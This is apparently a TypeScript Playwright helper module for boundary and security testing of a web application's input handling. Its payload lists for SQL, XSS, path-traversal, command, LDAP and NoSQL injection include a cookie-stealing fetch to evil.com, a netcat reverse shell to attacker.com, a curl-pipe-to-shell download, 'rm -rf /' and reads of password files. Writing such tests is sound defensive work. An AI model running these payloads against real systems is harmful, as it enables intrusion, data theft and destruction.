import { Page } from '@playwright/test';

/**
 * 边界测试工具类
 * 提供各种边界条件测试的辅助方法
 */
export class BoundaryTestingUtils {
  constructor(private page: Page) {}

  /**
   * 生成指定长度的字符串
   */
  generateString(length: number, char: string = 'a'): string {
    return char.repeat(length);
  }

  /**
   * 生成随机字符串
   */
  generateRandomString(length: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * 生成包含特殊字符的测试字符串
   */
  generateSpecialCharString(): string[] {
    return [
      '!@#$%^&*()',
      '[]{}|\\:";\'<>?,./~`',
      '中文字符测试',
      'Ñoño café',
      '🐕🐱🐾',
      'тест',
      'テスト'
    ];
  }

  /**
   * 生成SQL注入测试载荷
   */
  getSQLInjectionPayloads(): string[] {
    return [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "' OR 1=1 --",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' OR 'x'='x",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --"
    ];
  }

  /**
   * 生成XSS攻击测试载荷
   */
  getXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<div onclick="alert(1)">Click me</div>',
      '<marquee onstart=alert(1)>XSS</marquee>',
      '<details open ontoggle=alert(1)>',
      '<svg/onload=eval(atob("YWxlcnQoMSk="))>',
      'javascript:alert(1)',
      '<img src="x" onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">',
      '<script>document.cookie="stolen="+document.cookie</script>'
    ];
  }

  /**
   * 生成路径遍历攻击载荷
   */
  getPathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ];
  }

  /**
   * 生成命令注入测试载荷
   */
  getCommandInjectionPayloads(): string[] {
    return [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '`id`',
      '$(whoami)',
      '; rm -rf /',
      '| nc -e /bin/sh attacker.com 4444',
      '; curl http://evil.com/malware.sh | sh'
    ];
  }

  /**
   * 生成LDAP注入测试载荷
   */
  getLDAPInjectionPayloads(): string[] {
    return [
      '*)(uid=*',
      '*)(|(uid=*))',
      '*)(&(uid=*)',
      '*))%00',
      '*()|%26\'',
      '*)(objectClass=*'
    ];
  }

  /**
   * 生成NoSQL注入测试载荷
   */
  getNoSQLInjectionPayloads(): string[] {
    return [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      '{"$where": "this.username == this.password"}',
      '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
      '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}'
    ];
  }

  /**
   * 创建测试文件
   */
  async createTestFile(name: string, size: number, type: string = 'image/jpeg'): Promise<File> {
    const buffer = Buffer.alloc(size);
    return new File([buffer], name, { type });
  }

  /**
   * 创建恶意文件名测试用例
   */
  getMaliciousFileNames(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '<script>alert(1)</script>.jpg',
      'file with spaces and special chars!@#$.jpg',
      'very-long-filename-that-exceeds-normal-limits-and-might-cause-issues-with-filesystem-or-database-storage-and-should-be-truncated-or-rejected.jpg',
      'CON.jpg', // Windows reserved name
      'PRN.jpg', // Windows reserved name
      'AUX.jpg', // Windows reserved name
      'NUL.jpg', // Windows reserved name
      '.htaccess',
      'web.config',
      'file\x00.jpg', // Null byte injection
      'file\r\n.jpg', // CRLF injection
    ];
  }

  /**
   * 验证输入是否被正确清理
   */
  async verifyInputSanitization(selector: string, expectedCleanValue: string): Promise<boolean> {
    const actualValue = await this.page.locator(selector).textContent();
    return actualValue === expectedCleanValue;
  }

  /**
   * 验证错误消息是否显示
   */
  async verifyErrorMessage(selector: string, expectedMessage: string): Promise<boolean> {
    const errorElement = this.page.locator(selector);
    await errorElement.waitFor({ state: 'visible', timeout: 5000 });
    const actualMessage = await errorElement.textContent();
    return actualMessage?.includes(expectedMessage) || false;
  }

  /**
   * 验证没有JavaScript执行
   */
  async verifyNoScriptExecution(): Promise<boolean> {
    // 检查是否有alert对话框
    const dialogs = await this.page.locator('dialog[role="alertdialog"]').count();
    return dialogs === 0;
  }

  /**
   * 生成边界数值测试用例
   */
  getBoundaryNumbers(): { value: number; description: string; shouldPass: boolean }[] {
    return [
      { value: -1, description: '负数', shouldPass: false },
      { value: 0, description: '零', shouldPass: false },
      { value: 0.1, description: '最小正数', shouldPass: true },
      { value: 1, description: '最小整数', shouldPass: true },
      { value: Number.MAX_SAFE_INTEGER, description: '最大安全整数', shouldPass: false },
      { value: Number.POSITIVE_INFINITY, description: '正无穷', shouldPass: false },
      { value: Number.NEGATIVE_INFINITY, description: '负无穷', shouldPass: false },
      { value: NaN, description: 'NaN', shouldPass: false }
    ];
  }

  /**
   * 生成Unicode测试字符串
   */
  getUnicodeTestStrings(): string[] {
    return [
      '测试用户名123', // 中文+数字
      'тест', // 西里尔字母
      'テスト', // 日文片假名
      'ひらがな', // 日文平假名
      '한글', // 韩文
      'العربية', // 阿拉伯文
      'עברית', // 希伯来文
      '🐕🐱🐾', // Emoji
      'café', // 带重音符号
      'Ñoño', // 西班牙语字符
      'Москва', // 俄文
      'Ελληνικά', // 希腊文
      '𝕌𝕟𝕚𝕔𝕠𝕕𝕖', // 数学字母数字符号
      '🚀🌟💫', // 更多Emoji
      '\u200B\u200C\u200D', // 零宽字符
      '\uFEFF', // 字节顺序标记
    ];
  }

  /**
   * 等待并验证错误状态
   */
  async waitForErrorState(errorSelector: string, timeout: number = 5000): Promise<void> {
    await this.page.locator(errorSelector).waitFor({ 
      state: 'visible', 
      timeout 
    });
  }

  /**
   * 清理测试输入
   */
  async clearInput(selector: string): Promise<void> {
    await this.page.locator(selector).clear();
  }

  /**
   * 填充表单并验证
   */
  async fillAndValidateForm(
    formData: Record<string, string | number>,
    submitSelector: string,
    expectedErrors: Record<string, string>
  ): Promise<void> {
    // 填充表单
    for (const [field, value] of Object.entries(formData)) {
      await this.page.locator(`[data-testid="${field}"]`).fill(String(value));
    }

    // 提交表单
    await this.page.locator(submitSelector).click();

    // 验证错误消息
    for (const [field, expectedError] of Object.entries(expectedErrors)) {
      const errorSelector = `[data-testid="${field}-error"]`;
      await this.verifyErrorMessage(errorSelector, expectedError);
    }
  }
}

/**
 * 边界测试数据生成器
 */
export class BoundaryDataGenerator {
  /**
   * 生成字符串长度测试用例
   */
  static generateStringLengthTests(minLength: number, maxLength: number): Array<{
    length: number;
    description: string;
    shouldPass: boolean;
  }> {
    return [
      { length: 0, description: '空字符串', shouldPass: false },
      { length: minLength - 1, description: '低于最小长度', shouldPass: false },
      { length: minLength, description: '最小长度边界', shouldPass: true },
      { length: minLength + 1, description: '最小长度+1', shouldPass: true },
      { length: Math.floor((minLength + maxLength) / 2), description: '中间长度', shouldPass: true },
      { length: maxLength - 1, description: '最大长度-1', shouldPass: true },
      { length: maxLength, description: '最大长度边界', shouldPass: true },
      { length: maxLength + 1, description: '超过最大长度', shouldPass: false },
      { length: maxLength * 2, description: '远超最大长度', shouldPass: false }
    ];
  }

  /**
   * 生成数值边界测试用例
   */
  static generateNumberBoundaryTests(min: number, max: number): Array<{
    value: number;
    description: string;
    shouldPass: boolean;
  }> {
    return [
      { value: min - 1, description: '低于最小值', shouldPass: false },
      { value: min, description: '最小值边界', shouldPass: true },
      { value: min + 0.1, description: '最小值+0.1', shouldPass: true },
      { value: (min + max) / 2, description: '中间值', shouldPass: true },
      { value: max - 0.1, description: '最大值-0.1', shouldPass: true },
      { value: max, description: '最大值边界', shouldPass: true },
      { value: max + 1, description: '超过最大值', shouldPass: false }
    ];
  }
}

/**
 * 安全测试工具
 */
export class SecurityTestUtils {
  constructor(private page: Page) {}

  /**
   * 测试XSS防护
   */
  async testXSSProtection(inputSelector: string, outputSelector: string, payloads: string[]): Promise<boolean> {
    for (const payload of payloads) {
      await this.page.locator(inputSelector).fill(payload);
      await this.page.keyboard.press('Enter');
      
      // 等待处理
      await this.page.waitForTimeout(1000);
      
      // 检查输出是否被正确转义
      const output = await this.page.locator(outputSelector).textContent();
      if (output?.includes('<script>') || output?.includes('onerror=')) {
        return false;
      }
      
      // 检查是否有JavaScript执行
      const dialogs = await this.page.locator('dialog[role="alertdialog"]').count();
      if (dialogs > 0) {
        return false;
      }
    }
    
    return true;
  }

  /**
   * 测试SQL注入防护
   */
  async testSQLInjectionProtection(
    inputSelector: string, 
    submitSelector: string, 
    payloads: string[]
  ): Promise<boolean> {
    for (const payload of payloads) {
      await this.page.locator(inputSelector).fill(payload);
      await this.page.locator(submitSelector).click();
      
      // 等待响应
      await this.page.waitForTimeout(2000);
      
      // 检查是否有错误页面或异常行为
      const errorElements = await this.page.locator('[data-testid*="error"]').count();
      const unexpectedContent = await this.page.locator('body').textContent();
      
      // 如果出现数据库错误信息，说明注入可能成功
      if (unexpectedContent?.includes('SQL') || 
          unexpectedContent?.includes('database') ||
          unexpectedContent?.includes('mysql') ||
          unexpectedContent?.includes('postgresql')) {
        return false;
      }
    }
    
    return true;
  }

  /**
   * 测试文件上传安全性
   */
  async testFileUploadSecurity(
    uploadSelector: string,
    maliciousFiles: Array<{ name: string; type: string; content: Buffer }>
  ): Promise<boolean> {
    for (const file of maliciousFiles) {
      try {
        await this.page.setInputFiles(uploadSelector, {
          name: file.name,
          mimeType: file.type,
          buffer: file.content
        });
        
        // 等待处理
        await this.page.waitForTimeout(2000);
        
        // 检查是否有适当的错误消息
        const errorMessage = await this.page.locator('[data-testid*="error"]').textContent();
        if (!errorMessage || !errorMessage.includes('不支持') && !errorMessage.includes('无效')) {
          return false;
        }
      } catch (error) {
        // 如果抛出异常，可能是安全机制工作正常
        continue;
      }
    }
    
    return true;
  }
}